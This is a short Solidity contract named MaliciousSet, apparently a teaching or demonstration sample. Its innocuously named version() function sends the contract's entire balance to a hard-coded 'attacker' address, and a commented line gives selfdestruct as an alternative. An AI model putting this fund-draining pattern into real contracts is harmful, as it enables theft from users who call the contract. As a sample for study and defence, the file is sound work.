pragma solidity ^0.4.2;

contract MaliciousSet {
  
    address constant attackerAddr = 0x35..; //malevolent address

    uint8 public result;
    
    function setResult(uint8 res){result = res; } 
    function version(){ 
        this.setResult(5); 
        bool res = attackerAddr.send(this.balance); 
        //selfdestruct(attackerAddr);  //this works as well
    }  
}